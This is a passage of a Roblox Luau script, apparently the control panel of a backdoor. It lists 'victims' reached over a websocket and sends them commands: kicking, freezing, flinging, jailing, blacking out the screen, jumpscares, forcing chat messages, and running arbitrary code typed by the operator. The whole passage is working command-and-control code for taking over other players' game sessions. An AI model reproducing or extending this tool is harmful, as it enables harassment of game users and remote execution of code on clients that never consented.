    allLabel.TextXAlignment = Enum.TextXAlignment.Left
    allLabel.Parent = allCard

    local allPickBtn = Instance.new("TextButton")
    allPickBtn.Size = UDim2.new(0, 78, 0, 23)
    allPickBtn.Position = UDim2.new(1, -90, 0.5, -11)
    allPickBtn.Text = isTodosSelected and "[Selected]" or "Pick"
    allPickBtn.TextSize = 20
    allPickBtn.TextColor3 = isTodosSelected and Color3.fromRGB(100, 255, 150) or Color3.fromRGB(255, 255, 255)
    allPickBtn.Font = Enum.Font.Kalam
    allPickBtn.BackgroundColor3 = isTodosSelected and Color3.fromRGB(30, 80, 40) or Color3.fromRGB(0, 0, 0)
    allPickBtn.BackgroundTransparency = 0.2
    allPickBtn.BorderSizePixel = 0
    allPickBtn.Parent = allCard

    local allPickCorner = Instance.new("UICorner")
    allPickCorner.CornerRadius = UDim.new(0, 6)
    allPickCorner.Parent = allPickBtn

    allPickBtn.MouseButton1Click:Connect(function()
        selectedVictim = "TODOS"
        rebuildVictimsUI()
    end)

    local count = 1
    for name, info in pairs(connectedVictims) do
        count = count + 1
        local isSelected = (selectedVictim == name)
        local card = Instance.new("Frame")
        card.Name = "VictimCard_" .. name
        card.LayoutOrder = count
        card.Size = UDim2.new(1, -6, 0, 32)
        card.BackgroundColor3 = isSelected and Color3.fromRGB(50, 40, 70) or Color3.fromRGB(20, 20, 25)
        card.BackgroundTransparency = 0.2
        card.BorderSizePixel = 0
        card.Parent = ScrollingFrame_2194

        local cardCorner = Instance.new("UICorner")
        cardCorner.CornerRadius = UDim.new(0, 6)
        cardCorner.Parent = card

        local isSameGame = (game.PlaceId == tonumber(info.placeId))
        local tag = isSameGame and "[Mismo]" or "[Otro]"
        local nLabel = Instance.new("TextLabel")
        nLabel.Size = UDim2.new(0, 260, 1, 0)
        nLabel.Position = UDim2.new(0, 10, 0, 0)
        nLabel.BackgroundTransparency = 1
        nLabel.Text = name .. " " .. tag
        nLabel.TextColor3 = isSameGame and Color3.fromRGB(140, 255, 170) or Color3.fromRGB(240, 200, 120)
        nLabel.Font = Enum.Font.Kalam
        nLabel.TextSize = 20
        nLabel.TextXAlignment = Enum.TextXAlignment.Left
        nLabel.Parent = card

        local pickBtn = Instance.new("TextButton")
        pickBtn.Size = UDim2.new(0, 78, 0, 23)
        pickBtn.Position = UDim2.new(1, -175, 0.5, -11)
        pickBtn.Text = isSelected and "[Selected]" or "Pick"
        pickBtn.TextSize = 20
        pickBtn.TextColor3 = isSelected and Color3.fromRGB(100, 255, 150) or Color3.fromRGB(255, 255, 255)
        pickBtn.Font = Enum.Font.Kalam
        pickBtn.BackgroundColor3 = isSelected and Color3.fromRGB(30, 80, 40) or Color3.fromRGB(0, 0, 0)
        pickBtn.BackgroundTransparency = 0.2
        pickBtn.BorderSizePixel = 0
        pickBtn.Parent = card

        local pickCorner = Instance.new("UICorner")
        pickCorner.CornerRadius = UDim.new(0, 6)
        pickCorner.Parent = pickBtn

        pickBtn.MouseButton1Click:Connect(function()
            selectedVictim = name
            rebuildVictimsUI()
        end)

        local joinBtn = Instance.new("TextButton")
        joinBtn.Size = UDim2.new(0, 78, 0, 23)
        joinBtn.Position = UDim2.new(1, -90, 0.5, -11)
        joinBtn.Text = "Join"
        joinBtn.TextSize = 20
        joinBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
        joinBtn.Font = Enum.Font.Kalam
        joinBtn.BackgroundColor3 = isSameGame and Color3.fromRGB(20, 60, 40) or Color3.fromRGB(60, 40, 20)
        joinBtn.BackgroundTransparency = 0.2
        joinBtn.BorderSizePixel = 0
        joinBtn.Parent = card

        local joinCorner = Instance.new("UICorner")
        joinCorner.CornerRadius = UDim.new(0, 6)
        joinCorner.Parent = joinBtn

        joinBtn.MouseButton1Click:Connect(function()
            hopServer(info.placeId, info.jobId)
        end)
    end

    if victimCount == 0 then
        local emptyLbl = Instance.new("TextLabel")
        emptyLbl.Name = "EmptyLabel"
        emptyLbl.LayoutOrder = 99
        emptyLbl.Size = UDim2.new(1, -6, 0, 28)
        emptyLbl.BackgroundTransparency = 1
        emptyLbl.Text = "Buscando victimas conectadas..."
        emptyLbl.TextColor3 = Color3.fromRGB(160, 150, 180)
        emptyLbl.Font = Enum.Font.Kalam
        emptyLbl.TextSize = 16
        emptyLbl.Parent = ScrollingFrame_2194
    end

    ScrollingFrame_2194.CanvasSize = UDim2.new(0, 0, 0, (count + 1) * 36 + 10)
end

local function refreshList()
    TextButton_2336.Text = "..."
    if not wsConnected then connectWS() end
    if currentSocket and wsConnected then
        pcall(function()
            currentSocket:Send(HttpService:JSONEncode({type = "ping_victims"}))
        end)
    end
    task.wait(0.3)
    local now = tick()
    local changed = false
    for name, info in pairs(connectedVictims) do
        if now - (info.lastSeen or now) > 60 then
            connectedVictims[name] = nil
            changed = true
        end
    end
    rebuildVictimsUI()
    TextButton_2336.Text = "Refresh"
end

TextButton_2336.MouseButton1Click:Connect(function()
    task.spawn(refreshList)
end)

----------------------------------------------------
-- COMMAND BUTTON BINDINGS
----------------------------------------------------
local function hookBtn(btn, callback)
    local deb = false
    btn.MouseButton1Click:Connect(function()
        if deb then return end
        deb = true
        pcall(callback)
        local orig = btn.BackgroundColor3
        btn.BackgroundColor3 = Color3.fromRGB(50, 120, 70)
        task.delay(0.5, function()
            pcall(function()
                btn.BackgroundColor3 = orig
                deb = false
            end)
        end)
    end)
end

hookBtn(TextButton_4400, function() sendCmd("reset_character") end)
hookBtn(explotion, function() sendCmd("explosion") end)
hookBtn(TextButton_2313, function() sendCmd("kick") end)
hookBtn(jumpscare, function() sendCmd("red_scare") end)

hookBtn(TextButton_3709, function()
    local char = LocalPlayer.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if root then
        sendCmd("bring", {position = {x = root.Position.X, y = root.Position.Y, z = root.Position.Z}})
    end
end)
hookBtn(frezee, function() sendCmd("freeze") end)
hookBtn(unfrezee, function() sendCmd("unfreeze") end)
hookBtn(jail, function() sendCmd("jail") end)

hookBtn(TextButton_9166, function() sendCmd("unjail") end)
hookBtn(TextButton_3274, function() sendCmd("invert_controls") end)
hookBtn(TextButton_9884, function() sendCmd("restore_controls") end)
hookBtn(fling, function() sendCmd("fling") end)

hookBtn(TextButton_2026, function() sendCmd("snail_speed") end)
hookBtn(TextButton_5783, function() sendCmd("super_speed") end)
hookBtn(TextButton_5465, function() sendCmd("normal_speed") end)
hookBtn(blackscreen, function() sendCmd("blackout") end)

-- Exec Op Hooks
hookBtn(TextButton_8449, function()
    sendCmd("screen_alert", {message = message.Text})
end)

hookBtn(chatSendBtn, function()
    sendCmd("chat", {message = chatBox.Text})
end)

hookBtn(scriptSendBtn, function()
    sendCmd("execute", {code = scriptBox.Text})
end)

----------------------------------------------------
-- BACKGROUND CONNECTION & CONTINUOUS SYNC LOOP
----------------------------------------------------
rebuildVictimsUI()

task.spawn(function()
    connectWS()
    task.wait(0.5)
    refreshList()
    while true do
        task.wait(3)
        if not wsConnected or not currentSocket then
            connectWS()
        else
            local pingOk = pcall(function()
                currentSocket:Send(HttpService:JSONEncode({type = "ping_victims"}))
            end)
            if not pingOk then
                wsConnected = false
                currentSocket = nil
                connectWS()
            end
            local now = tick()
            local changed = false
            for name, info in pairs(connectedVictims) do
                if now - (info.lastSeen or now) > 60 then
                    connectedVictims[name] = nil
                    changed = true
                end
            end
            if changed and rebuildVictimsUI then rebuildVictimsUI() end
        end
    end
end)

return ScreenGui
